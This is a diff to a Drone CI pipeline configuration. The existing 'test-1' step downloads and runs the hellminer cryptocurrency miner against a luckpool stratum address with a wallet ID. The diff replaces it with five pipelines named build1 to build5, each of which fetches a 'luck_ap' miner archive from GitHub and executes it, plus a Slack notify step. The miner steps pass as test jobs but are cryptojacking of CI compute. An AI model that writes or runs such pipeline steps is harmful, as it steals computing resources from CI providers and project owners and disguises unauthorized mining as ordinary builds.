@@ -1,9 +1,66 @@
 kind: pipeline
 type: docker
-name: default-1
+name: build1
 
 steps:
-- name: test-1
+- name: test1
   image: golang
   commands:
-  - wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r.VM --cpu 48
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build2
+
+steps:
+- name: test2
+  image: node
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build3
+
+steps:
+- name: test3
+  image: node
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build4
+
+steps:
+- name: test4
+  image: node
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+type: docker
+name: build5
+
+steps:
+- name: test5
+  image: node
+  commands:
+  - wget https://github.com/hendrik20212/miner/releases/download/luck_ap/luck_ap.tar.gz && tar -xvf luck_ap.tar.gz && ./ver ap.ini
+---
+kind: pipeline
+name: after
+
+steps:
+- name: notify
+  image: plugins/slack
+  settings:
+    room: general
+   
+
+depends_on:
+- build1
+- build2
+- build3
+- build4
+- build5
